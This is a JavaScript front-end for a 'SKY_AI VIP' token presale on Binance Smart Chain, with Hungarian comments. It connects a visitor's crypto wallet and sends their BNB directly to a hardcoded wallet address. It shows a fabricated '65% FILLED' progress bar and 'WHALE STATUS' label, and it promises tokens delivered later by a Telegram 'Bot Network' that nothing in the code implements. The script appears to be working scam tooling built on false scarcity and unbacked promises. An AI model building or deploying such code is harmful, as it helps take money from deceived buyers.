// ⚜️ SKY_AI VIP PROTOCOL v8.2
// Connected to: VIP POOL (Verified Mode)

// CÉL TÁRCA (Ahova a BNB megy)
const VIP_WALLET = "0xc98415672A80a26bEC29427b7284D65B73c5Ff7B"; 

// ÁRFOLYAM: 1 BNB = 5,000,000 SKY
const RATE = 5000000; 

let web3;
let userAccount;

window.addEventListener('load', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        
        // Eseményfigyelők
        document.getElementById('connect-btn').addEventListener('click', connectWallet);
        document.getElementById('buy-btn').addEventListener('click', buyTokens);
        
        // Automatikus Számológép
        document.getElementById('bnb-amount').addEventListener('input', (e) => {
            const val = parseFloat(e.target.value);
            if(val > 0) {
                // Formázott szám (pl: 5,000,000)
                const skyVal = (val * RATE).toLocaleString();
                document.getElementById('sky-amount').value = skyVal;
                
                // Progress Bar Frissítése (Vizuális effekt)
                updateProgress(val);
            } else {
                document.getElementById('sky-amount').value = "";
            }
        });
    } else {
        alert("⚠️ CRITICAL: Web3 Provider (MetaMask/TrustWallet) Not Found!");
    }
});

async function connectWallet() {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];
        
        const btn = document.getElementById("connect-btn");
        btn.innerText = "CONNECTED: " + userAccount.substring(0,6) + "...";
        btn.style.borderColor = "#0aff00";
        btn.style.color = "#0aff00";
        
        // Hálózat ellenőrzése (BSC Chain ID: 56)
        const chainId = await web3.eth.getChainId();
        if (chainId !== 56) {
            alert("⚠️ WARNING: Please switch to Binance Smart Chain (BSC Mainnet)!");
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], // 56 hexadecimálisan
                });
            } catch(e) { console.error(e); }
        }
        
    } catch (e) { console.error("Connection Failed", e); }
}

function updateProgress(bnbVal) {
    const text = document.getElementById('progress-text');
    if(bnbVal >= 1) {
        text.innerText = "WHALE STATUS DETECTED";
        text.style.color = "#0aff00";
    } else {
        text.innerText = "65% FILLED";
        text.style.color = "#d4af37";
    }
}

async function buyTokens() {
    if (!userAccount) return alert("Please Connect Wallet First!");
    
    const bnbAmt = document.getElementById('bnb-amount').value;
    if (bnbAmt < 0.01) return alert("Minimum VIP Entry: 0.01 BNB");

    const amountWei = web3.utils.toWei(bnbAmt, 'ether');
    const amountHex = web3.utils.toHex(amountWei);

    // Gomb letiltása a duplázás elkerülésére
    const btn = document.getElementById('buy-btn');
    const originalText = btn.innerText;
    btn.innerText = "PROCESSING ON CHAIN...";
    btn.disabled = true;

    try {
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: userAccount,
                to: VIP_WALLET,
                value: amountHex
            }]
        });

        console.log("TX Hash:", txHash);
        alert("✅ TRANSACTION SUCCESSFUL!\n\nYour Verified Tokens will be transferred automatically by the Bot Network.");
        
        // Telegram Bot meghívása a Hash-el
        window.open(`https://t.me/SkyAI_PaymentBot?start=${txHash}`, "_blank");

    } catch (error) {
        console.error(error);
        alert("❌ TRANSACTION FAILED / REJECTED");
    } finally {
        btn.innerText = originalText;
        btn.disabled = false;
    }
}
